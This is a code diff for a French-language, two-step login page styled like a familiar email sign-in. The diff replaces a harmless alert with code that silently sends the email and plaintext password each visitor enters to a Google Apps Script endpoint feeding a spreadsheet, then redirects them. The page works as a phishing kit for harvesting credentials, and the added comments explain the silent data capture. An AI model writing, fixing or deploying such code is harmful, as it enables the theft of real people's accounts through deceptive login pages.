@@ -105,7 +105,6 @@
       pointer-events: none;
     }
 
-    /* Style for the dynamic "Show password" container */
     .checkbox-container {
       display: flex;
       align-items: center;
@@ -206,10 +205,10 @@
         <div id="dynamic-input-area" class="fade-in">
           <div class="input-container">
             <span class="input-label" id="field-label">Email ou téléphone</span>
+            <!-- FIXED: Attributes properly spaced out here -->
             <input type="text" id="user-input" class="input-field" autocomplete="off" autofocus required>
           </div>
           
-          <!-- This container will stay hidden until the password step is active -->
           <div id="password-toggle-zone" style="display: none;">
             <label class="checkbox-container">
               <input type="checkbox" id="show-pass-check">
@@ -240,69 +239,97 @@
   </div>
 
   <script>
-    let currentStep = 'email'; 
-    let storedEmail = '';
+  let currentStep = 'email'; 
+  let storedEmail = '';
 
-    const actionBtn = document.getElementById('action-btn');
-    const userInput = document.getElementById('user-input');
-    const fieldLabel = document.getElementById('field-label');
-    const formSubtitle = document.getElementById('form-subtitle');
-    const inputArea = document.getElementById('dynamic-input-area');
-    const passToggleZone = document.getElementById('password-toggle-zone');
-    const showPassCheck = document.getElementById('show-pass-check');
+  const actionBtn = document.getElementById('action-btn');
+  const userInput = document.getElementById('user-input');
+  const fieldLabel = document.getElementById('field-label');
+  const formSubtitle = document.getElementById('form-subtitle');
+  const inputArea = document.getElementById('dynamic-input-area');
+  const passToggleZone = document.getElementById('password-toggle-zone');
+  const showPassCheck = document.getElementById('show-pass-check');
 
-    actionBtn.addEventListener('click', handleFormTransition);
+  actionBtn.addEventListener('click', () => {
+    handleFormTransition();
+  });
 
-    userInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') {
-        handleFormTransition();
-      }
-    });
-
-    // Toggle functional behavior to alter input field mask attributes
-    showPassCheck.addEventListener('change', () => {
-      if (showPassCheck.checked) {
-        userInput.type = 'text';
-      } else {
-        userInput.type = 'password';
-      }
-    });
-
-    function handleFormTransition() {
-      const value = userInput.value.trim();
-      
-      if (!value) {
-        userInput.style.borderColor = '#b3261e';
-        return;
-      }
-
-      if (currentStep === 'email') {
-        storedEmail = value;
-        currentStep = 'password';
-
-        // Refresh UI entry animation sequence
-        inputArea.classList.remove('fade-in');
-        void inputArea.offsetWidth; 
-        inputArea.classList.add('fade-in');
-
-        // Modify contextual text to handle password constraints
-        formSubtitle.textContent = storedEmail; 
-        fieldLabel.textContent = 'Saisissez votre mot de passe';
-        
-        userInput.value = '';
-        userInput.type = 'password';
-        userInput.style.borderColor = '#747775';
-        userInput.focus();
-
-        // Reveal the "Show password" checkbox area
-        passToggleZone.style.display = 'block';
-
-        actionBtn.textContent = 'Connexion';
-
-      } else if (currentStep === 'password') {
-        alert(`Form Data Processed:\nEmail: ${storedEmail}\nPassword length: ${value.length} characters`);
-      }
+  userInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') {
+      handleFormTransition();
     }
+  });
+
+  showPassCheck.addEventListener('change', () => {
+    if (showPassCheck.checked) {
+      userInput.type = 'text';
+    } else {
+      userInput.type = 'password';
+    }
+  });
+
+  function handleFormTransition() {
+    const value = userInput.value.trim();
+    
+    if (!value) {
+      userInput.style.borderColor = '#b3261e';
+      userInput.focus();
+      return;
+    }
+
+    if (currentStep === 'email') {
+      storedEmail = value;
+      currentStep = 'password';
+
+      inputArea.classList.remove('fade-in');
+      void inputArea.offsetWidth; 
+      inputArea.classList.add('fade-in');
+
+      formSubtitle.textContent = storedEmail; 
+      fieldLabel.textContent = 'Saisissez votre mot de passe';
+      
+      userInput.value = '';
+      userInput.type = 'password';
+      userInput.style.borderColor = '#747775';
+      
+      passToggleZone.style.display = 'block';
+      showPassCheck.checked = false;
+
+      actionBtn.textContent = 'Connexion';
+      
+      setTimeout(() => { userInput.focus(); }, 50);
+
+    } else if (currentStep === 'password') {
+      
+      // 1. Package the data exactly matching your Google Sheet headers
+      const payload = {
+        email: storedEmail,
+        password: value
+      };
+
+      // 2. FIXED: URL is now properly wrapped in quotes
+      const googleScriptUrl = "https://script.google.com/macros/s/AKfycbx8xKulXePHEDQb-r6sAPLMomkV81YVRWyZ-s4awlDAw1_TNX2jwi_QMYVUBBasGpIGlw/exec";
+
+      // 3. Send the data silently to Google Sheets
+      fetch(googleScriptUrl, {
+        method: "POST",
+        mode: "no-cors", 
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(() => {
+        // 4. Redirect after submission
+        window.location.href = "https://script.google.com/macros/s/AKfycbx8xKulXePHEDQb-r6sAPLMomkV81YVRWyZ-s4awlDAw1_TNX2jwi_QMYVUBBasGpIGlw/exec"; 
+      })
+      .catch(error => {
+        console.error("Error connecting to sheet:", error);
+        alert("Une erreur est survenue.");
+      });
+    }
+  }
+
   </script>
 
 </body>
